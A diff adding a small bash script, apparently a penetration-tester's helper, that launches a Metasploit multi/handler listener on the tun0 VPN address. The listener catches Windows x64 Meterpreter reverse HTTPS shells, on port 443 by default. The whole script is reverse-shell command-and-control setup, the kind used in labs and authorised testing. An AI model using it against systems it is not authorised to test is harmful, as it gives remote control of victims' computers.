@@ -1,0 +1,14 @@
+#! /bin/bash
+if [ $# -eq 0 ]
+then
+  echo "No port specified, defaulting to port 443"
+  port="443"
+else
+  port=$1
+fi
+
+ipaddr="$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')"
+echo "Starting MSF Console"
+echo "ip: $ipaddr port: $port payload: windows/x64/meterpreter/reverse_https"
+
+sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST $ipaddr;set LPORT $port;set EXITFUNC thread; run;"
